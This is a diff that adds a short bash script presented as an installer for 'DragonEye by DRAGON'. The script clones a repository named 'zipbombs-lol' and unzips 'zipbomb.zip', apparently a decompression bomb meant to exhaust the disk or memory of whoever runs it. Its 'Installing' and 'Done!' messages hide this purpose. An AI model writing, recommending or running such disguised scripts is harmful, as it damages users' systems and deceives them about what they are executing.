@@ -1,0 +1,15 @@
+#!/usr/bin/env bash
+set -e
+
+echo "Installing DragonEye by DRAGON..."
+
+# Clone the repository
+git clone https://github.com/12hrformat/zipbombs-lol.git
+
+# Enter the directory
+cd zipbombs-lol
+
+# Unzip a file
+unzip zipbomb.zip
+
+echo "Done!"
